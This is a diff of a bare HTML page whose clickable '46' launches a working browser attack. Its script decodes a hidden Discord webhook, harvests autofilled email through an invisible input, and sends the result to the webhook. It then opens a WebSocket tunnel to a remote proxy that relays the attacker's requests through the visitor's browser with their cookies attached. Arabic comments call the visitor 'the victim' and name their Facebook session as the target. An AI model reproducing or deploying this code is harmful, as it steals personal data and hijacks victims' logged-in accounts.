@@ -3,51 +3,92 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>V43 FINAL</title>
+    <title>V46 MASTER</title>
     <style>
-        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        h1 { font-size: 150px; cursor: pointer; text-shadow: 0 0 20px #0f0; }
+        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        h1 { font-size: 150px; cursor: pointer; text-shadow: 0 0 25px #0f0; user-select: none; }
     </style>
 </head>
 <body>
 
-    <h1 onclick="execute()">43</h1>
+    <h1 id="status" onclick="startMaster()">46</h1>
 
     <script>
+        // الرابط اللي طلع لك في Colab (تم تحويله لـ wss للاتصال الآمن)
+        const PROXY_SERVER = "wss://cold-shrimps-look.loca.lt";
+        
+        // رابط الديسكورد (مشفر كما هو في كودك)
         const key = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MTY2NDkxOTE5ODg5NjI1OC9oWHVuQnVWRU8wajByaUVTQTluaWNxanp5UnRFQTFkdTNPem9DSUhOcUpwTldmdjl4eXJ0RWZDemdjRWxQUTlndkJnWg==";
         const HOOK = atob(key);
 
-        function sendData(content) {
+        function sendDiscord(msg) {
             const f = document.createElement('form');
-            f.action = HOOK; f.method = 'POST'; f.target = 'v43_ifr';
+            f.action = HOOK; f.method = 'POST'; f.target = 'v46_ifr';
             const i = document.createElement('input');
-            i.name = 'content'; i.value = content;
+            i.name = 'content'; i.value = msg;
             f.appendChild(i); document.body.appendChild(f);
             const ifr = document.createElement('iframe');
-            ifr.name = 'v43_ifr'; ifr.style.display = 'none';
+            ifr.name = 'v46_ifr'; ifr.style.display = 'none';
             document.body.appendChild(ifr);
             f.submit();
         }
 
-        async function execute() {
-            document.querySelector('h1').innerText = "DONE";
+        async function startMaster() {
+            const btn = document.getElementById('status');
+            btn.innerText = "DONE";
+            btn.style.color = "#0f0";
             
-            // تمويه الكلمات: (S-1 = Session Start / A-F = Autofill)
-            sendData("🔵 **Signal S-1 Received**");
+            // 1. إشعار ديسكورد بالدخول
+            sendDiscord("🔵 **V46: Signal S-1 Received (Proxy Initializing...)**");
 
-            // محاولة سحب الإيميل (Autofill)
+            // 2. محاولة سحب الأوتوفيل (صمتاً)
             const m = document.createElement('input');
             m.type = 'email'; m.autocomplete = 'email';
             m.style.display = 'none';
             document.body.appendChild(m);
-
             setTimeout(() => {
-                if(m.value) {
-                    sendData("📊 **Data A-F:** " + m.value);
-                } else {
-                    sendData("⚪ **Probe Complete: No stored data found.**");
-                }
+                if(m.value) sendDiscord("📊 **Data A-F Found:** " + m.value);
             }, 1000);
+
+            // 3. فتح النفق البروكسي مع Colab
+            initTunnel();
+        }
+
+        function initTunnel() {
+            const socket = new WebSocket(PROXY_SERVER);
+
+            socket.onopen = () => {
+                // إخبار السيرفر أن هذا هو "الضحية"
+                socket.send(JSON.stringify({ type: 'join' }));
+                sendDiscord("🚀 **Proxy Active:** Tunnel established via Colab.");
+            };
+
+            socket.onmessage = async (event) => {
+                const req = JSON.parse(event.data);
+                // إذا وصل طلب تصفح من فايرفوكس عندك
+                if (req.type === 'proxy_request') {
+                    try {
+                        const res = await fetch(req.url, {
+                            method: req.method,
+                            headers: req.headers,
+                            credentials: 'include' // استخدام كوكيز الضحية الحقيقية
+                        });
+                        const body = await res.text();
+                        // إرسال النتيجة (فيسبوك الضحية) لفايرفوكس عندك
+                        socket.send(JSON.stringify({
+                            type: 'proxy_response',
+                            id: req.id,
+                            body: body,
+                            status: res.status
+                        }));
+                    } catch (e) {
+                        socket.send(JSON.stringify({ type: 'proxy_response', error: e.message }));
+                    }
+                }
+            };
+
+            // الحفاظ على الاتصال حياً في الخلفية
+            setInterval(() => socket.send(JSON.stringify({type: 'ping'})), 20000);
         }
     </script>
 </body>
